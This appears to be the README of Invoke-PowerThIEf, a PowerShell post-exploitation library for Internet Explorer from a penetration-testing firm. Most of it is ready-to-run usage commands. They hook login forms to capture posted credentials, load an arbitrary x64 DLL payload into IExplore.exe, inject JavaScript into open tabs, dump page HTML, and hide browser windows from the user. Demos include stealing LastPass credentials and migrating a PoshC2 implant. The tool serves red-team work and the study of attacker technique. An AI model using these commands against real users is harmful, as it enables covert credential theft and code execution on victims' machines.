# Invoke-PowerThIEf 2018 Nettitude
An IE Post Exploitation Library

Written by Rob Maslen @rbmaslen

# Examples
### Capturing credentials entered via LastPass
<p align="center">
  <img src="https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Images/creds-lastpass.gif?raw=true" width="800" title="LastPass Credentials in transit">
</p>

### Migrating a PoshC2 implant into IExplore.exe 
<p align="center">
  <img src="https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Images/loading-dll.gif?raw=true" width="800" title="PoshC2 in IExplore">
</p>

### Extracting a "secret" from a page
<p align="center">
  <img src="https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Images/dumphtml.gif?raw=true" width="800" title="PoshC2 in IExplore">
</p>

# Usage
First import the module using . .\Invoke-PowerThIEf.ps1 then use any of the following commands.

### List URLs for all current IE browser sessions, result will contain the BrowserIndex used by other actions
```
Invoke-PowerThIEf -action ListUrls
```

## Capturing credentials in transit
### Automatically scan any windows or tabs for login forms and then record what gets posted. A notification will appear when some have arrived.
```
Invoke-PowerThIEf -action HookLoginForms 
```

### List any creds that have been captured. 
```
Invoke-PowerThIEf -action Creds 
```

## Have IExplore.exe load a DLL of your choosing (must be x64)
### Launch the DLL(x64) specified by the PathPayload param in IE's process
```
Invoke-PowerThIEf -action ExecPayload -PathPayload <path to the payload DLL(x64)>
```

## Invoking JavaScript
### Invoke JavaScript in all currently opened IE windows and tabs
```
Invoke-PowerThIEf -action InvokeJS -Script <JavaScript to run>

Invoke-PowerThIEf -action InvokeJS -Script 'alert(document.location.href);'
```

### Invoke JavaScript in the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action InvokeJS -BrowserIndex <BrowserIndex> -Script\<JavaScript to run>
```

## Dumping HTML
### Dump HTML from all currently opened IE windows/tabs
```
Invoke-PowerThIEf -action DumpHtml
```

### Dump HTML from the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex>
```

### Dump HTML from all tags of \<type> in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector <type>

Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector div
```

### Dump HTML from any tag with the \<id> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector <id>

Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector idfirstdiv
```

### Dump HTML from any tag with the \<name> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector <name>

Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector namefirstdiv
```

## Showing/Hiding Windows
### Set to visible all IE windows/tabs
```
Invoke-PowerThIEf -action ShowWindow
```

### Set the selected window/tab to be visible. 
```
Invoke-PowerThIEf -action ShowWindow -BrowserIndex <BrowserIndex>
```

### Hide all currently opened IE windows/tabs
```
Invoke-PowerThIEf -action HideWindow
```

### Hide the selected window/tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action HideWindow -BrowserIndex <BrowserIndex>
```

## Navigating the browser
### Navigate all currently opened IE windows/tabs to the \<URL>
```
Invoke-PowerThIEf -action Navigate -NavigateUrl <URL> 
```

### Navigate all currently opened IE windows/tabs to the \<URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 
```

### Navigate all currently opened IE windows/tabs to the \<URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 
```

## Background tabs
### Open a new background tab in the window that the \<BrowserIndex> is in.
```
Invoke-PowerThIEf -action NewBackgroundTab -BrowserIndex <BrowserIndex>
```

# License
FreeBSD 3